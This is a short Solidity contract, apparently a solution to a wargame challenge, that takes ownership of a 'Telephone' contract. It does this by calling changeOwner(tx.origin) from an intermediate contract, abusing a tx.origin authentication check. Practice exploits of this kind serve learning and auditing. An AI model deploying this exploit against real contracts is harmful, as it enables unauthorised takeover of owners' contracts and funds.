// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttacker {


  constructor() {
  }

    function attack(address _telephoneAddr) external {
        ITelephone(_telephoneAddr).changeOwner(tx.origin);
    }
}